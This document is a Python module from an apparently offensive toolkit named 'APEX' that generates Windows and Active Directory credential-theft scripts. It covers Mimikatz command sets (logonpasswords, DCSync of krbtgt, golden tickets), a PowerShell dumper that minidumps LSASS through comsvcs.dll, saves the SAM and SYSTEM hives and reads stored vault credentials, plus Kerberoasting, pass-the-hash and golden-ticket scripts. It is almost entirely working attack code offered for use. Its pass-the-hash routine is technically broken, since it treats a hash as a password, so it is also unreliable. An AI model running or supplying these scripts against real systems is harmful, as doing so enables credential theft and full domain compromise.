"""
APEX Windows/AD Credential Dumper
Mimikatz-style credential extraction techniques
"""
import os
import subprocess
import base64

def generate_mimikatz_script(technique='sekurlsa'):
    """Generate Mimikatz commands for credential dumping"""
    commands = {
        'sekurlsa': [
            'privilege::debug',
            'sekurlsa::logonpasswords',
            'sekurlsa::ekeys',
            'sekurlsa::dpapi',
            'sekurlsa::tspkg',
        ],
        'lsa': [
            'privilege::debug',
            'lsadump::lsa /patch',
            'lsadump::sam',
            'lsadump::secrets',
            'lsadump::cache',
        ],
        'dcsync': [
            'lsadump::dcsync /domain:DOMAIN /user:krbtgt',
            'lsadump::dcsync /domain:DOMAIN /user:Administrator',
            'lsadump::dcsync /domain:DOMAIN /all',
        ],
        'kerberos': [
            'privilege::debug',
            'kerberos::list',
            'kerberos::tgt',
            'kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:HASH /id:500',
        ],
        'token': [
            'privilege::debug',
            'token::elevate',
            'token::whoami',
        ]
    }
    
    return commands.get(technique, commands['sekurlsa'])


def generate_powershell_cred_dump():
    """Generate PowerShell credential dumping script"""
    script = '''
# APEX Credential Dumper - PowerShell
# Dump credentials from LSASS, SAM, and browser stores

function Dump-LSASS {
    try {
        $process = Get-Process lsass -ErrorAction Stop
        $dumpPath = "$env:TEMP\\lsass_apex.dmp"
        
        # Create minidump of LSASS
        rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $($process.Id) $dumpPath full
        
        Write-Output "[+] LSASS dump created: $dumpPath"
        return $dumpPath
    } catch {
        Write-Output "[-] Failed to dump LSASS: $_"
    }
}

function Dump-SAM {
    try {
        # Save SAM and SYSTEM hives
        reg save HKLM\\SAM "$env:TEMP\\sam_apex" /y 2>$null
        reg save HKLM\\SYSTEM "$env:TEMP\\system_apex" /y 2>$null
        Write-Output "[+] SAM and SYSTEM hives saved"
    } catch {
        Write-Output "[-] Failed to dump SAM: $_"
    }
}

function Dump-BrowserPasswords {
    $browsers = @(
        @{Name="Chrome"; Path="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"},
        @{Name="Edge"; Path="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"},
        @{Name="Firefox"; Path="$env:APPDATA\\Mozilla\\Firefox\\Profiles"}
    )
    
    foreach ($browser in $browsers) {
        if (Test-Path $browser.Path) {
            Write-Output "[+] Found $($browser.Name) data: $($browser.Path)"
        }
    }
}

function Dump-StoredCredentials {
    try {
        $vault = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new()
        $creds = $vault.RetrieveAll()
        foreach ($cred in $creds) {
            $cred.RetrievePassword()
            Write-Output "[+] Stored credential: $($cred.Resource) - $($cred.UserName)"
        }
    } catch {
        Write-Output "[-] No stored credentials accessible"
    }
}

# Execute all dumps
Dump-LSASS
Dump-SAM
Dump-BrowserPasswords
Dump-StoredCredentials

Write-Output "[+] Credential dump complete"
'''
    return script


def generate_kerberoast_script(domain):
    """Generate Kerberoasting attack script"""
    script = f'''
# APEX Kerberoasting Attack
# Request service tickets for offline cracking

# Find service accounts
Get-ADUser -Filter {{ServicePrincipalName -like "*"}} -Properties ServicePrincipalName | 
    Select-Object SamAccountName, ServicePrincipalName

# Request TGS tickets
Add-Type -AssemblyName System.IdentityModel
$users = Get-ADUser -Filter {{ServicePrincipalName -like "*"}} -Properties ServicePrincipalName

foreach ($user in $users) {{
    try {{
        $tgs = Request-SPNTicket -SPN $user.ServicePrincipalName[0] -Format Hashcat
        Write-Output "[+] TGS for $($user.SamAccountName): $tgs"
    }} catch {{
        Write-Output "[-] Failed: $($user.SamAccountName)"
    }}
}}
'''
    return script


def generate_pass_the_hash_script(target_host, ntlm_hash, username='Administrator'):
    """Generate Pass-the-Hash attack script"""
    script = f'''
# APEX Pass-the-Hash Attack
# Authenticate using NTLM hash without knowing password

$secpass = ConvertTo-SecureString "{ntlm_hash}" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("{username}", $secpass)

# Execute command on target
Invoke-Command -ComputerName {target_host} -Credential $cred -ScriptBlock {{
    whoami
    hostname
    ipconfig
}}

# Alternative: PSExec-style
# psexec.exe \\\\{target_host} -u {username} -p {ntlm_hash} cmd.exe
'''
    return script


def generate_golden_ticket_script(domain, domain_sid, krbtgt_hash, username='Administrator'):
    """Generate Golden Ticket attack script"""
    script = f'''
# APEX Golden Ticket Attack
# Forge Kerberos TGT for persistent domain admin access

mimikatz # privilege::debug
mimikatz # kerberos::golden /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_hash} /user:{username} /id:500 /groups:512,513,518,519,520 /ptt

# Now you have domain admin access
# dir \\\\DC01\\c$
# psexec \\\\DC01 cmd.exe
'''
    return script